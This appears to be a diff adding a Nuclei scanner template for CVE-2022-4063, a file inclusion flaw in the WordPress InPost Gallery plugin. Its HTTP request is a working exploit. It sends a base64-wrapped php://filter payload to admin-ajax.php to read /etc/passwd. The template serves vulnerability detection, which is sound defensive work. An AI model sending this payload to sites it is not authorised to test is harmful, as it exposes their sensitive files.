@@ -1,0 +1,35 @@
+id: CVE-2022-4063
+
+info:
+  name: WordPress Plugin InPost Gallery File Inclusion
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    A file inclusion vulnerability in the WordPress Plugin InPost Gallery (< 2.1.4.1) allows attackers to obtain sensitive files.
+  reference:
+    - https://wpscan.com/vulnerability/6bb07ec1-f1aa-4f4b-9717-c92f651a90a7
+  classification:
+    cve-id: CVE-2022-4063
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+  tags: file-read, file-inclusion
+
+variables:
+  filePath: "/etc/passwd"
+
+http:
+  - raw:
+      - |
+        GET /wp-admin/admin-ajax.php?action=inpost_gallery_get_gallery&popup_shortcode_key=inpost_fancy&popup_shortcode_attributes={{base64('{"pagepath": "php://filter/convert.base64-encode/resource={{filePath}}"}') }} HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        User-Agent: Nuclei
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "popup_shortcode_attributes"
+        part: body
+      - type: status
+        status:
+          - 200
